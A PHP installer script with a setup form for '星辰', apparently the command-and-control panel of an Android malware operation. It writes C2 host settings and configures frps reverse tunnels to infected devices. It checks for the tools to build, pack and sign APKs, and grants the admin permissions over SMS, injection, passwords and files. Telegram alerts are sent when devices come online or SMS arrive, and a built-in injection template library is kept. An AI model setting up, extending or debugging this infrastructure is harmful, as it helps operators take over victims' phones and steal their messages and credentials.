<?php
declare(strict_types=1);

// 星辰 one-page installer. Delete or lock this file after installation.
error_reporting(E_ALL);
ini_set('display_errors', '1');

$root = dirname(__DIR__);
$lockFile = $root . '/runtime/install.lock';
$schemaFile = $root . '/install/schema.sql';
$seedFile = $root . '/install/seed.sql';
$envFile = $root . '/.env';
$messages = [];
$errors = [];

function h($value): string { return htmlspecialchars((string)$value, ENT_QUOTES, 'UTF-8'); }
function postv(string $key, string $default = ''): string { return trim((string)($_POST[$key] ?? $default)); }
function random_secret(): string { return bin2hex(random_bytes(32)); }

function executable_candidates(string $name, array $extra = []): array {
    $candidates = $extra;
    $path = (string)getenv('PATH');
    foreach (array_filter(explode(PATH_SEPARATOR, $path)) as $directory) {
        $candidates[] = rtrim($directory, DIRECTORY_SEPARATOR) . DIRECTORY_SEPARATOR . $name;
    }
    $result = [];
    foreach ($candidates as $candidate) {
        if (!is_string($candidate) || $candidate === '' || isset($result[$candidate])) continue;
        $result[$candidate] = $candidate;
    }
    return array_values($result);
}

function first_executable(array $candidates): string {
    foreach ($candidates as $candidate) {
        if (is_file($candidate) && is_executable($candidate)) return $candidate;
    }
    return '';
}

function run_version_command(string $binary, array $arguments): array {
    $command = array_merge([$binary], $arguments);
    if (function_exists('proc_open')) {
        $pipes = [];
        $process = @proc_open($command, [1 => ['pipe', 'w'], 2 => ['pipe', 'w']], $pipes, null, null, ['bypass_shell' => true]);
        if (is_resource($process)) {
            $output = stream_get_contents($pipes[1]) . stream_get_contents($pipes[2]);
            fclose($pipes[1]);
            fclose($pipes[2]);
            return ['code' => proc_close($process), 'output' => trim($output)];
        }
    }
    if (function_exists('exec')) {
        $output = [];
        $code = 1;
        $parts = array_map('escapeshellarg', $command);
        @exec(implode(' ', $parts) . ' 2>&1', $output, $code);
        return ['code' => $code, 'output' => trim(implode("\n", $output))];
    }
    return ['code' => 127, 'output' => 'PHP 的 proc_open/exec 均不可用，无法执行版本校验'];
}

function inspect_apk_build_environment(string $root): array {
    $javaExtras = [];
    $javaHome = trim((string)getenv('JAVA_HOME'));
    if ($javaHome !== '') $javaExtras[] = $javaHome . '/bin/java';
    $javaExtras[] = '/usr/bin/java';
    foreach (glob('/www/server/java/*/bin/java') ?: [] as $candidate) $javaExtras[] = $candidate;
    $java = '';

    $checks = [];
    $errors = [];
    $javaVersion = '';
    $javaResult = ['code' => 127, 'output' => ''];
    $javaMajor = 0;
    foreach (executable_candidates('java', $javaExtras) as $candidate) {
        if (!is_file($candidate) || !is_executable($candidate)) continue;
        $candidateResult = run_version_command($candidate, ['-version']);
        if ($candidateResult['code'] === 0 && preg_match('/version\s+"(?:1\.)?(\d+)(?:[._][^\"]*)?"/i', $candidateResult['output'], $match)) {
            $candidateMajor = (int)$match[1];
            if ($java === '' || $candidateMajor > $javaMajor) {
                $java = $candidate;
                $javaResult = $candidateResult;
                $javaMajor = $candidateMajor;
            }
            if ($candidateMajor >= 11) break;
        }
    }
    if ($java === '') {
        $errors[] = '未找到 Java/JDK；请在宝塔“软件商店 → Java环境管理器”安装 JDK 11';
        $checks[] = ['ok' => false, 'name' => 'Java/JDK 11+', 'detail' => '未找到'];
    } else {
        $javaVersion = trim(strtok($javaResult['output'], "\r\n"));
        $ok = $javaMajor >= 11;
        if (!$ok) $errors[] = 'Java 版本过低（当前 ' . $javaMajor . '），请安装 JDK 11 或更高版本';
        $checks[] = ['ok' => $ok, 'name' => 'Java/JDK 11+', 'detail' => $java . ' · ' . $javaVersion];
    }

    $keytoolExtras = $java !== '' ? [dirname($java) . '/keytool'] : [];
    $keytool = first_executable(executable_candidates('keytool', $keytoolExtras));
    $keytoolOk = $keytool !== '';
    if ($keytoolOk) {
        $keytoolResult = run_version_command($keytool, ['-help']);
        $keytoolOk = $keytoolResult['code'] === 0;
    }
    if (!$keytoolOk) $errors[] = '未找到 keytool；当前可能只有 JRE，需要完整 JDK 11';
    $checks[] = ['ok' => $keytoolOk, 'name' => 'JDK keytool', 'detail' => $keytoolOk ? $keytool : '未找到或无法执行'];

    foreach ([
        ['name' => 'Python 3', 'binary' => 'python3', 'args' => ['--version'], 'extra' => ['/usr/bin/python3']],
        ['name' => 'unzip', 'binary' => 'unzip', 'args' => ['-v'], 'extra' => ['/usr/bin/unzip']],
    ] as $required) {
        $binary = first_executable(executable_candidates($required['binary'], $required['extra']));
        $ok = $binary !== '';
        if ($ok) {
            $result = run_version_command($binary, $required['args']);
            $ok = $result['code'] === 0;
        }
        if (!$ok) $errors[] = '未找到或无法执行 ' . $required['name'];
        $checks[] = ['ok' => $ok, 'name' => $required['name'], 'detail' => $binary !== '' ? $binary : '未找到'];
    }

    foreach ([
        ['name' => 'APK 签名器', 'path' => $root . '/extend/apksigner.jar', 'executable' => false],
        ['name' => 'APK 签名脚本', 'path' => $root . '/extend/jiake/tools/apksigner', 'executable' => true],
    ] as $requiredFile) {
        $ok = is_file($requiredFile['path']) && is_readable($requiredFile['path'])
            && (!$requiredFile['executable'] || is_executable($requiredFile['path']));
        if (!$ok) $errors[] = $requiredFile['name'] . '缺失或权限不正确：' . $requiredFile['path'];
        $checks[] = ['ok' => $ok, 'name' => $requiredFile['name'], 'detail' => $requiredFile['path']];
    }

    return ['ok' => !$errors, 'checks' => $checks, 'errors' => $errors, 'java' => $java, 'java_version' => $javaVersion];
}

function prepare_runtime_directories(string $root): void {
    $directories = [
        'runtime',
        'runtime/apk_build_queue',
        'runtime/apk_assets',
        'runtime/apk_output',
        'runtime/log',
        'public/storage',
    ];
    foreach ($directories as $relative) {
        $path = $root . '/' . $relative;
        if (!is_dir($path) && !@mkdir($path, 0775, true) && !is_dir($path)) {
            throw new RuntimeException('无法创建目录 ' . $relative . '，请在宝塔文件管理器中将父目录所有者设为 www');
        }
        @chmod($path, 0775);
        clearstatcache(true, $path);
        if (!is_writable($path)) {
            throw new RuntimeException('目录 ' . $relative . ' 不可写，请在宝塔文件管理器中将所有者设为 www、权限设为 775，并应用到子目录');
        }
    }
}

function valid_username(string $username): bool { return (bool)preg_match('/^[A-Za-z0-9_.-]{3,64}$/', $username); }
function valid_chat_id(string $chatId): bool { return $chatId === '' || (bool)preg_match('/^-?\d{5,20}$/', $chatId); }
function valid_bot_token(string $token): bool { return $token === '' || (bool)preg_match('/^\d{5,20}:[A-Za-z0-9_-]{20,}$/', $token); }
function valid_server_host(string $host): bool {
    return (bool)preg_match('/^(?:[A-Za-z0-9](?:[A-Za-z0-9.-]{0,251}[A-Za-z0-9])?|\[[0-9A-Fa-f:]+\]|[0-9A-Fa-f:]+)$/', $host);
}
function valid_port(string $port): bool {
    return ctype_digit($port) && (int)$port >= 1 && (int)$port <= 65535;
}
function valid_frps_secret(string $value): bool { return (bool)preg_match('/^[A-Za-z0-9_.:@-]+$/', $value); }

function upsert_setting(PDO $pdo, string $key, string $value, int $now): void {
    $sql = "INSERT INTO fisher_settings (`key`,`value`,`created_at`,`updated_at`) VALUES (?,?,?,?) "
        . "ON DUPLICATE KEY UPDATE `value`=VALUES(`value`), `updated_at`=VALUES(`updated_at`)";
    $pdo->prepare($sql)->execute([$key, $value, $now, $now]);
}

function split_sql_statements(string $sql): array {
    $statements = [];
    $buffer = '';
    $quote = null;
    $escaped = false;
    $length = strlen($sql);

    for ($i = 0; $i < $length; $i++) {
        $char = $sql[$i];
        $next = $i + 1 < $length ? $sql[$i + 1] : '';

        if ($quote !== null) {
            $buffer .= $char;
            if ($escaped) {
                $escaped = false;
            } elseif ($char === '\\') {
                $escaped = true;
            } elseif ($char === $quote) {
                if ($next === $quote) {
                    $buffer .= $next;
                    $i++;
                } else {
                    $quote = null;
                }
            }
            continue;
        }

        if ($char === "'" || $char === '"' || $char === '`') {
            $quote = $char;
            $buffer .= $char;
            continue;
        }
        if ($char === '-' && $next === '-' && ($i + 2 >= $length || ctype_space($sql[$i + 2]))) {
            while ($i < $length && $sql[$i] !== "\n") $i++;
            $buffer .= "\n";
            continue;
        }
        if ($char === '#') {
            while ($i < $length && $sql[$i] !== "\n") $i++;
            $buffer .= "\n";
            continue;
        }
        if ($char === '/' && $next === '*') {
            $end = strpos($sql, '*/', $i + 2);
            $i = $end === false ? $length : $end + 1;
            $buffer .= "\n";
            continue;
        }
        if ($char === ';') {
            $statement = trim($buffer);
            if ($statement !== '') $statements[] = $statement;
            $buffer = '';
            continue;
        }
        $buffer .= $char;
    }

    $statement = trim($buffer);
    if ($statement !== '') $statements[] = $statement;
    return $statements;
}

function import_sql_file(PDO $pdo, string $sqlFile, string $label): int {
    if (!is_file($sqlFile)) {
        throw new RuntimeException('缺少 ' . $label);
    }
    $sql = file_get_contents($sqlFile);
    if ($sql === false || trim($sql) === '') {
        throw new RuntimeException($label . ' 为空');
    }
    $count = 0;
    foreach (split_sql_statements($sql) as $stmt) {
        $pdo->exec($stmt);
        $count++;
    }
    return $count;
}

function write_env_file(string $envFile, array $cfg): void {
    $existing = is_file($envFile) ? file_get_contents($envFile) : '';
    $appDebug = preg_match('/^APP_DEBUG\s*=\s*([^\r\n]+)/m', (string)$existing, $m) ? trim($m[1]) : 'false';
    $appTrace = preg_match('/^APP_TRACE\s*=\s*([^\r\n]+)/m', (string)$existing, $m) ? trim($m[1]) : 'false';
    $content = "APP_DEBUG = {$appDebug}\nAPP_TRACE = {$appTrace}\n\n";
    $content .= "[APP]\nDEFAULT_TIMEZONE = Asia/Shanghai\n\n";
    $content .= "[DATABASE]\n";
    $content .= "TYPE = mysql\n";
    $content .= "HOSTNAME = {$cfg['db_host']}\n";
    $content .= "DB_NAME = {$cfg['db_name']}\n";
    $content .= "DATABASE = {$cfg['db_name']}\n";
    $content .= "USERNAME = {$cfg['db_user']}\n";
    $content .= "PASSWORD = {$cfg['db_pass']}\n";
    $content .= "HOSTPORT = {$cfg['db_port']}\n";
    $content .= "CHARSET = utf8mb4\n";
    $content .= "PREFIX = fisher_\n\n";
    $content .= "[JWT]\nJWT_SECRET = {$cfg['jwt_secret']}\n\n";
    $content .= "[SERVER]\nWS_HOST = 127.0.0.1\nWS_PORT = 8889\n\n";
    $content .= "[FRPS]\n";
    $content .= "FRPS_ADDR = {$cfg['frps_addr']}\n";
    $content .= "FRPS_PORT = {$cfg['frps_port']}\n";
    $content .= "FRPS_TOKEN = {$cfg['frps_token']}\n";
    $content .= "FRPS_REMOTE_PORT_MIN = {$cfg['frps_remote_port_min']}\n";
    $content .= "FRPS_REMOTE_PORT_MAX = {$cfg['frps_remote_port_max']}\n";
    $content .= "DEFAULT_REMOTE_PORT = 19901\n";
    $content .= "LOCAL_SERVICE_PORT = 7912\n";
    $content .= "FRPS_DASHBOARD_HOST = 127.0.0.1\n";
    $content .= "FRPS_DASHBOARD_PORT = {$cfg['frps_dashboard_port']}\n";
    $content .= "FRPS_DASHBOARD_USER = {$cfg['frps_dashboard_user']}\n";
    $content .= "FRPS_DASHBOARD_PASSWORD = {$cfg['frps_dashboard_password']}\n\n";
    $content .= "[EXTERNAL]\n";
    $content .= "EXTERNAL_HOST = {$cfg['frps_addr']}\n";
    $content .= "EXTERNAL_PORT = 8889\n";
    $content .= "C2_HOST = {$cfg['node_ws_url']}\n";
    $content .= "C2_WS_HOST = {$cfg['node_ws_url']}\n";
    if (file_put_contents($envFile, $content, LOCK_EX) === false) {
        throw new RuntimeException('写入项目根目录 .env 失败');
    }
    @chmod($envFile, 0640);
}

function link_node_env(string $root, string $envFile): void {
    $nodeEnv = $root . '/node-ws/.env';
    if (is_link($nodeEnv) && readlink($nodeEnv) === '../.env') return;
    if (file_exists($nodeEnv) || is_link($nodeEnv)) {
        if (!@unlink($nodeEnv)) throw new RuntimeException('无法替换 node-ws/.env');
    }
    if (!@symlink('../.env', $nodeEnv)) {
        if (!@copy($envFile, $nodeEnv)) throw new RuntimeException('无法让 Node WS 共用根目录 .env');
    }
}

$alreadyLocked = is_file($lockFile);
$defaults = [
    'db_host' => '127.0.0.1',
    'db_port' => '3306',
    'db_name' => '',
    'db_user' => '',
    'db_pass' => '',
    'admin_user' => 'admin',
    'admin_pass' => '',
    'bot_token' => '',
    'chat_id' => '',
    'api_proxy' => '',
    'frontend_url' => (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . ($_SERVER['HTTP_HOST'] ?? ''),
    'backend_url' => (isset($_SERVER['HTTPS']) ? 'https://' : 'http://') . ($_SERVER['HTTP_HOST'] ?? ''),
    'node_ws_url' => ((isset($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? 'wss://' : 'ws://') . ($_SERVER['HTTP_HOST'] ?? ''),
    'frps_addr' => preg_replace('/:\d+$/', '', (string)($_SERVER['HTTP_HOST'] ?? '')),
    'frps_port' => '7000',
    'frps_token' => random_secret(),
    'frps_remote_port_min' => '19902',
    'frps_remote_port_max' => '29999',
    'frps_dashboard_port' => '7500',
    'frps_dashboard_user' => 'admin',
    'frps_dashboard_password' => random_secret(),
    'force' => '',
];
$data = array_merge($defaults, array_intersect_key($_POST, $defaults));
$apkEnvironment = inspect_apk_build_environment($root);

if ($_SERVER['REQUEST_METHOD'] === 'POST' && !$alreadyLocked) {
    foreach (['db_host','db_port','db_name','db_user','admin_user','admin_pass','frps_addr','frps_token','frps_dashboard_user','frps_dashboard_password'] as $key) {
        if (postv($key) === '') $errors[] = $key . ' 不能为空';
    }
    if (!valid_username(postv('admin_user'))) $errors[] = '管理员账号需为 3-64 位字母/数字/下划线/点/短横线';
    if (strlen(postv('admin_pass')) < 6) $errors[] = '管理员密码至少 6 位';
    if (!valid_bot_token(postv('bot_token'))) $errors[] = '机器人 Token 格式不正确';
    if (!valid_chat_id(postv('chat_id'))) $errors[] = 'Telegram 用户 Chat ID 格式不正确';
    if (!preg_match('#^wss?://[^\\s/]+/?$#i', postv('node_ws_url'))) $errors[] = 'Node WebSocket 地址格式不正确，应类似 wss://example.com';
    if (!valid_server_host(postv('frps_addr'))) $errors[] = 'FRPS 对外地址只能填公网 IP 或域名，不要带 http:// 和端口';
    foreach (['frps_port','frps_remote_port_min','frps_remote_port_max','frps_dashboard_port'] as $key) {
        if (!valid_port(postv($key))) $errors[] = $key . ' 不是有效端口';
    }
    if (valid_port(postv('frps_remote_port_min')) && valid_port(postv('frps_remote_port_max')) && (int)postv('frps_remote_port_min') > (int)postv('frps_remote_port_max')) {
        $errors[] = '隐道端口起始值不能大于结束值';
    }
    if (strlen(postv('frps_token')) < 32) $errors[] = 'FRPS Token 至少 32 个字符';
    foreach (['frps_token','frps_dashboard_user','frps_dashboard_password'] as $key) {
        if (postv($key) !== '' && !valid_frps_secret(postv($key))) $errors[] = $key . ' 只能包含字母、数字、点、下划线、冒号、@ 和短横线';
    }
    if (!extension_loaded('pdo_mysql')) $errors[] = '服务器缺少 pdo_mysql 扩展';
    if (!$apkEnvironment['ok']) {
        foreach ($apkEnvironment['errors'] as $environmentError) {
            $errors[] = 'APK 构建环境：' . $environmentError;
        }
    }

    if (!$errors) {
        try {
            prepare_runtime_directories($root);
            $messages[] = '运行目录检查通过：runtime、APK 队列/资源/输出目录和 public/storage 均可写';
            $cfg = [
                'db_host' => postv('db_host'),
                'db_port' => postv('db_port'),
                'db_name' => postv('db_name'),
                'db_user' => postv('db_user'),
                'db_pass' => postv('db_pass'),
                'jwt_secret' => random_secret(),
                'node_ws_url' => rtrim(postv('node_ws_url'), '/'),
                'frps_addr' => postv('frps_addr'),
                'frps_port' => postv('frps_port'),
                'frps_token' => postv('frps_token'),
                'frps_remote_port_min' => postv('frps_remote_port_min'),
                'frps_remote_port_max' => postv('frps_remote_port_max'),
                'frps_dashboard_port' => postv('frps_dashboard_port'),
                'frps_dashboard_user' => postv('frps_dashboard_user'),
                'frps_dashboard_password' => postv('frps_dashboard_password'),
            ];
            $pdo = new PDO(
                "mysql:host={$cfg['db_host']};port={$cfg['db_port']};dbname={$cfg['db_name']};charset=utf8mb4",
                $cfg['db_user'],
                $cfg['db_pass'],
                [PDO::ATTR_ERRMODE => PDO::ERRMODE_EXCEPTION, PDO::ATTR_DEFAULT_FETCH_MODE => PDO::FETCH_ASSOC]
            );
            $pdo->exec('SET NAMES utf8mb4');

            if (postv('force') === '1') {
                $tables = $pdo->query("SHOW TABLES LIKE 'fisher_%'")->fetchAll(PDO::FETCH_COLUMN);
                $pdo->exec('SET FOREIGN_KEY_CHECKS=0');
                foreach ($tables as $table) {
                    if (preg_match('/^fisher_[A-Za-z0-9_]+$/', $table)) $pdo->exec("DROP TABLE IF EXISTS `{$table}`");
                }
                $pdo->exec('SET FOREIGN_KEY_CHECKS=1');
                $messages[] = '已按要求清空旧 fisher_ 表';
            }

            $stmtCount = import_sql_file($pdo, $GLOBALS['schemaFile'], 'install/schema.sql');
            $messages[] = '数据库结构导入完成：' . $stmtCount . ' 条语句';
            $seedCount = import_sql_file($pdo, $GLOBALS['seedFile'], 'install/seed.sql');
            $messages[] = '基础数据导入完成：' . $seedCount . ' 条语句（仅注入模板与权限菜单，不含设备、账号、APK 构建记录和日志）';

            $now = time();
            $adminUser = postv('admin_user');
            $adminPass = postv('admin_pass');
            $chatId = postv('chat_id');
            $botToken = postv('bot_token');
            $apiProxy = postv('api_proxy');
            $permissions = json_encode(['dashboard','control','sms','apk','settings','injection','node','passwords','files','ai','logs','accounts'], JSON_UNESCAPED_UNICODE);

            $existing = $pdo->prepare('SELECT id FROM fisher_users WHERE username=? LIMIT 1');
            $existing->execute([$adminUser]);
            $row = $existing->fetch();
            if ($row) {
                $adminId = (int)$row['id'];
                $pdo->prepare('UPDATE fisher_users SET password_hash=?, role=?, permissions=?, max_devices=9999, max_sub_users=999, parent_username="", enabled=1, expire_at=0, avatar=?, telegram_chat_id=?, updated_at=? WHERE id=?')
                    ->execute([password_hash($adminPass, PASSWORD_BCRYPT), 'superadmin', $permissions, '/assets/img/mx_logo.png', $chatId, $now, $adminId]);
            } else {
                $pdo->prepare('INSERT INTO fisher_users (username,password_hash,role,permissions,max_devices,max_sub_users,parent_username,enabled,expire_at,avatar,telegram_chat_id,last_login_at,created_at,updated_at) VALUES (?,?,?,?,9999,999,"",1,0,?,?,0,?,?)')
                    ->execute([$adminUser, password_hash($adminPass, PASSWORD_BCRYPT), 'superadmin', $permissions, '/assets/img/mx_logo.png', $chatId, $now, $now]);
                $adminId = (int)$pdo->lastInsertId();
            }

            if ($botToken !== '') upsert_setting($pdo, 'tg_' . $adminId . '_bot_token', $botToken, $now);
            if ($chatId !== '') {
                upsert_setting($pdo, 'tg_' . $adminId . '_chat_id', $chatId, $now);
                upsert_setting($pdo, 'tg_user_' . $adminUser . '_chat_id', $chatId, $now);
                upsert_setting($pdo, 'chat_id', $chatId, $now);
            }
            if ($botToken !== '') upsert_setting($pdo, 'bot_token', $botToken, $now);
            if ($apiProxy !== '') {
                upsert_setting($pdo, 'tg_' . $adminId . '_api_proxy', $apiProxy, $now);
                upsert_setting($pdo, 'api_proxy', $apiProxy, $now);
            }
            upsert_setting($pdo, 'sys_jwt_secret', $cfg['jwt_secret'], $now);
            upsert_setting($pdo, 'sys_frontend_url', postv('frontend_url'), $now);
            upsert_setting($pdo, 'sys_backend_url', postv('backend_url'), $now);
            upsert_setting($pdo, 'sys_node_ws_url', postv('node_ws_url'), $now);
            upsert_setting($pdo, 'sys_frps_addr', $cfg['frps_addr'], $now);
            upsert_setting($pdo, 'sys_frps_port', $cfg['frps_port'], $now);
            upsert_setting($pdo, 'sys_open_registration', '0', $now);
            upsert_setting($pdo, 'sys_default_role', 'user', $now);
            upsert_setting($pdo, 'sys_default_max_devices', '100', $now);
            upsert_setting($pdo, 'notify_online', '1', $now);
            upsert_setting($pdo, 'notify_sms', '1', $now);
            upsert_setting($pdo, 'apk_build_state', '{"is_building":false,"progress":100,"message":"ready","logs":[]}', $now);
            upsert_setting($pdo, 'cdn_config', '{"type":"local"}', $now);
            upsert_setting($pdo, 'bt_deploy_config', '{"enabled":false}', $now);
            upsert_setting($pdo, 'auto_build_config', '{"enabled":false}', $now);
            upsert_setting($pdo, 'auto_build_targets', '[]', $now);

            write_env_file($envFile, $cfg);
            link_node_env($root, $envFile);
            file_put_contents($lockFile, "installed_at=" . date('c') . "\nadmin={$adminUser}\n", LOCK_EX);
            $alreadyLocked = true;
            $messages[] = '安装完成，管理员已创建/更新';
        } catch (Throwable $e) {
            $errors[] = $e->getMessage();
        }
    }
}
?>
<!doctype html>
<html lang="zh-CN"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
<title>星辰 安装向导</title>
<style>
body{margin:0;font-family:-apple-system,BlinkMacSystemFont,"Segoe UI",Arial;background:#16001f;color:#f8f3ff}.wrap{max-width:860px;margin:36px auto;padding:28px;background:rgba(255,255,255,.06);border:1px solid rgba(190,80,255,.35);border-radius:18px;box-shadow:0 20px 60px rgba(0,0,0,.35)}h1{margin:0 0 8px;font-size:30px}h2{margin:24px 0 10px;font-size:20px}.hint{color:#cbb6ff;margin-bottom:22px}.grid{display:grid;grid-template-columns:1fr 1fr;gap:14px}.env-grid{display:grid;grid-template-columns:1fr 1fr;gap:8px}.env-item{padding:10px 12px;border-radius:9px;font-size:13px;word-break:break-all}.env-name{display:block;font-weight:700;margin-bottom:4px}label{display:block;font-size:14px;color:#d8c7ff;margin-bottom:6px}input{box-sizing:border-box;width:100%;padding:12px;border-radius:10px;border:1px solid #5b356d;background:#21062d;color:#fff}button{margin-top:18px;width:100%;padding:14px;border:0;border-radius:12px;background:linear-gradient(90deg,#2673ff,#a43df5);color:#fff;font-weight:700;font-size:16px}.box{padding:12px;border-radius:10px;margin:10px 0}.ok{background:#08351f;color:#bdf8d4}.err{background:#4b1111;color:#ffd4d4}.full{grid-column:1/-1}.small{font-size:13px;color:#bba7db}.disabled{opacity:.65}code{color:#ffd479}@media(max-width:720px){.grid,.env-grid{grid-template-columns:1fr}.wrap{margin:12px}}</style>
</head><body><main class="wrap">
<h1>星辰 安装向导</h1><div class="hint">初始化数据库、管理员、共享 .env 和内置 frps 配置。</div>
<h2>APK 构建环境</h2>
<div class="env-grid">
<?php foreach ($apkEnvironment['checks'] as $check): ?>
  <div class="env-item <?=$check['ok'] ? 'ok' : 'err'?>"><span class="env-name"><?=$check['ok'] ? '✓' : '✗'?> <?=h($check['name'])?></span><?=h($check['detail'])?></div>
<?php endforeach; ?>
</div>
<?php if (!$apkEnvironment['ok']): ?><div class="box err">环境校验未通过，安装提交将被拦截。宝塔用户请在“软件商店 → Java环境管理器”安装 JDK 11 后刷新本页。</div><?php endif; ?>
<?php foreach ($messages as $m): ?><div class="box ok"><?=h($m)?></div><?php endforeach; ?>
<?php foreach ($errors as $e): ?><div class="box err"><?=h($e)?></div><?php endforeach; ?>
<?php if ($alreadyLocked): ?>
  <div class="box ok">系统已安装。锁文件：<code>runtime/install.lock</code></div>
  <div class="box ok">在服务器终端执行一次：<br><code>sudo bash <?=h($root)?>/deploy/install-frps.sh</code><br>将生成 <code><?=h($root)?>/frps/</code>，可在宝塔 Node 项目中选择 <code>start</code> 启动。</div>
  <p class="small">如需重新安装，请先备份数据，再删除 <code>runtime/install.lock</code> 后访问本页。</p>
  <p><a style="color:#9fd4ff" href="/">进入系统</a></p>
<?php else: ?>
<form method="post" autocomplete="off">
  <div class="grid">
    <div><label>数据库地址</label><input name="db_host" value="<?=h($data['db_host'])?>" required></div>
    <div><label>数据库端口</label><input name="db_port" value="<?=h($data['db_port'])?>" required></div>
    <div><label>数据库名</label><input name="db_name" value="<?=h($data['db_name'])?>" required></div>
    <div><label>数据库用户</label><input name="db_user" value="<?=h($data['db_user'])?>" required></div>
    <div class="full"><label>数据库密码</label><input type="password" name="db_pass" value="<?=h($data['db_pass'])?>"></div>
    <div><label>管理员账号</label><input name="admin_user" value="<?=h($data['admin_user'])?>" required></div>
    <div><label>管理员密码</label><input type="password" name="admin_pass" value="<?=h($data['admin_pass'])?>" required></div>
    <div class="full"><label>Telegram Bot Token</label><input name="bot_token" value="<?=h($data['bot_token'])?>" placeholder="123456:ABC..."></div>
    <div><label>管理员 Telegram Chat ID</label><input name="chat_id" value="<?=h($data['chat_id'])?>" placeholder="例如 123456789"></div>
    <div><label>Telegram API 代理，可空</label><input name="api_proxy" value="<?=h($data['api_proxy'])?>" placeholder="http://127.0.0.1:7890"></div>
    <div class="full"><label>前端地址</label><input name="frontend_url" value="<?=h($data['frontend_url'])?>"></div>
    <div class="full"><label>后端地址</label><input name="backend_url" value="<?=h($data['backend_url'])?>"></div>
    <div class="full"><label>Node WebSocket 地址</label><input name="node_ws_url" value="<?=h($data['node_ws_url'])?>"></div>
    <div class="full"><label>FRPS 对外公网 IP 或域名（不带协议/端口）</label><input name="frps_addr" value="<?=h($data['frps_addr'])?>" required></div>
    <div><label>FRPS 服务端口</label><input name="frps_port" value="<?=h($data['frps_port'])?>" required></div>
    <div><label>FRPS Token（自动生成）</label><input type="password" name="frps_token" value="<?=h($data['frps_token'])?>" required></div>
    <div><label>设备隐道端口起始</label><input name="frps_remote_port_min" value="<?=h($data['frps_remote_port_min'])?>" required></div>
    <div><label>设备隐道端口结束</label><input name="frps_remote_port_max" value="<?=h($data['frps_remote_port_max'])?>" required></div>
    <div><label>FRPS 面板端口</label><input name="frps_dashboard_port" value="<?=h($data['frps_dashboard_port'])?>" required></div>
    <div><label>FRPS 面板用户</label><input name="frps_dashboard_user" value="<?=h($data['frps_dashboard_user'])?>" required></div>
    <div><label>FRPS 面板密码（自动生成）</label><input type="password" name="frps_dashboard_password" value="<?=h($data['frps_dashboard_password'])?>" required></div>
    <div class="full small"><label><input style="width:auto" type="checkbox" name="force" value="1" checked> 清空旧 fisher_ 表后安装干净数据库（保留内置注入模板库）</label></div>
  </div>
  <button type="submit">开始安装</button>
</form>
<p class="small">安装成功后会生成唯一的根目录 <code>.env</code>。再执行页面给出的命令，即会从项目内置包生成 <code>frps/</code> 目录。</p>
<?php endif; ?>
</main></body></html>
